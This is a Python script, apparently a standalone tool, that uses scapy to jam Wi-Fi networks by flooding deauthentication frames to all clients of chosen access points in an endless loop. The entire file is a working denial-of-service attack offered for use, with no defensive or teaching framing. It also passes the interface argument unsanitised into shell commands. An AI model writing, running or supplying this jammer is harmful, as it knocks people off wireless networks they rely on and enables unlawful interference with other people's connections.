#!/usr/bin/python 3
import time
import sys
from scapy.all import *
import optparse

parser = optparse.OptionParser()

parser.add_option('-i', '--interface', dest='INTERFACE', type=str, help='')
parser.add_option('-b', '--bssid', dest='BSSID', type=str, help='')
parser.add_option('-c', '--channel', dest='CHANNEL', type=str,  help='')
options, args = parser.parse_args()

class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[32m'
   LIGHTGREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   ORANGE = '\033[33m'
   END = '\033[0m'

def ERROR_print(msg):
    print(color.END+"["+color.RED+"x"+color.END+"]"+color.RED+" "+msg+color.CYAN)

def WARNING_print(msg):
    print(color.END+"["+color.ORANGE+"WARNING"+color.END+"]"+color.ORANGE+" "+msg+color.CYAN)

def SUCCESS_print(msg):
    print(color.END+"["+color.LIGHTGREEN+"+"+color.END+"]"+color.LIGHTGREEN+" "+msg+color.CYAN)

def INFO_print(msg):
    print(color.END+"["+color.YELLOW+"INFO"+color.END+"]"+color.YELLOW+" "+msg+color.CYAN)

def OVER_print(msg):
    sys.stdout.write("\033[F") #back to previous line
    sys.stdout.write("\033[K") #clear line
    print(msg)

BSSIDS = []

# Deauth Packet Creator
def Block(client=None, Station=None):
    c = client or "FF:FF:FF:FF:FF:FF"
    pkt = RadioTap()/Dot11(addr1=c, addr2=Station, addr3=Station)/Dot11Deauth()
    #print pkt.__repr__()
    return pkt

# Sending Function
def PacketSender(interface, pkt, count=1, gap=0.5, deauth=1):
    conf.iface = interface
    sendp(pkt,iface=interface, count=count, verbose=False)

# Main Function
def main(INTERFACE, CHANNEL):
    os.system("iwconfig {0} channel {1}".format(INTERFACE, int(CHANNEL)))
    if "," in options.BSSID:
        CLEANED = options.BSSID.replace(",", " ")
        CLEANED = CLEANED.split()
        for bssid in CLEANED:
            BSSIDS.append(bssid)
    else:
        BSSIDS.append(options.BSSID)

    while True:
        try:
            for bssid in BSSIDS:
                print("["+color.CYAN+color.UNDERLINE+"WiFi_JAMMER"+color.END+"] Sending Deauth to "+color.CYAN+color.UNDERLINE+bssid+color.END)
                PacketSender(INTERFACE,Block(Station=bssid))
        except KeyboardInterrupt:
            monitor_quest = input("[?] Would you like to stop monitor mode? [Y/N]: ".format(INTERFACE))
            
            if monitor_quest == "Y" or monitor_quest == "y":
                print("[*] Yes? Ok stopping monitor mode for you ...")
                os.system("airmon-ng stop {0} >/dev/null 2>&1 &".format(INTERFACE))
                os.system("service network-manager start >/dev/null 2>&1 &")       
            break
            exit()

# Main Trigger
if __name__=="__main__":
    main(options.INTERFACE, options.CHANNEL)
